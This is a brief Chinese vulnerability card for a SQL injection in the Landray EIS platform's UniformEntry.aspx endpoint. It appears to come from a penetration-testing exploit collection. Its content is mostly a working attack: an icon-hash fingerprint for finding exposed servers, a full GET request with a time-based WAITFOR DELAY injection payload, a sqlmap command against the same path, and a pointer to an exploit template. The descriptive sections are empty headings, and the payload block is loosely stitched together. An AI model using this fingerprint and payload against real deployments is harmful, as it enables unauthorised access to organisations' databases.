# 蓝凌EIS智慧协同平台UniformEntry接口SQL注入漏洞

- **系统**：蓝凌EIS智慧协同平台UniformEntry接口　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.icon=="585275a4cc54b8414554d03e1359a101"`
- **请求**：`GET /third/DingTalk/Pages/UniformEntry.aspx?moduleid=1%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: ASP.NET_SessionId=3ec5ixjhunwabhq5poammn55; FIOA_IMG_FOLDER=FI`

**请求体 / payload**
```

sqlmap
/third/DingTalk/Pages/UniformEntry.aspx?moduleid=1

\[蓝凌-EIS-uniformentry-sql注入\_exp.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 蓝凌 EIS智慧协同平台UniformEntry接口SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌EIS智慧协同办公平台